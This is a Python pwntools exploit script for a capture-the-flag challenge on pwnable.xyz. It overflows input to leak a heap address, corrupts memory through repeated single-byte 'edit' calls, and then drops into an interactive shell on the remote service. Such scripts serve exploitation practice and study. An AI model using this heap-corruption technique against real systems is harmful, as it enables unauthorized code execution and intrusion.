from pwn import *
import time

#target=process('./challenge')
target=remote('svc.pwnable.xyz',30015)

def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))

def play(n1,n2):
	init(1)
	time.sleep(0.1)
	target.sendline(str(n1)+" "+str(n2))
	
def save(data):
	init(2)
	print(target.recvuntil(": "))
	target.send(data)

def delete(index):
	init(3)
	print(target.recvuntil(": "))
	target.sendline(str(index))
	
def leak():
	init(4)
	print(target.recvuntil(": "))
	leaks=target.recvline().strip("\n")
	return leaks

def edit(old,new):
	init(5)
	print(target.recvuntil(": "))
	target.sendline(str(old))
	print(target.recvuntil(": "))
	target.sendline(str(new))

print(target.recvuntil(": "))
target.send("A"*0x7f)
save("D"*0x80)
leaks=leak()

heap_leak=u64(leaks[0x80:].ljust(8,"\x00"))
print(hex(heap_leak))
l=len(hex(heap_leak))
'''
b1=p8(int(hex(heap_leak)[l-2:l],16))
b2=p8(int(hex(heap_leak)[l-4:l-2],16))

heap_chunk=heap_leak-0xa0
print(hex(heap_chunk))
t1=p8(int(hex(heap_chunk)[l-2:l],16))
t2=p8(int(hex(heap_chunk)[l-4:l-2],16))

print(hex(u8(b1)))
print(hex(u8(b2)))
print(hex(u8(t1)))
print(hex(u8(t2)))
pause()
edit(b1,t1)
edit(b2,t2)
'''
b=p8(int(hex(heap_leak)[2:3],16))
t="\x79"
edit(b,t)
for i in range(4):
	edit("\x07",t)	
edit("\x6b","\xf3")
edit("\x0d","\x0c")
init(1)
target.interactive()
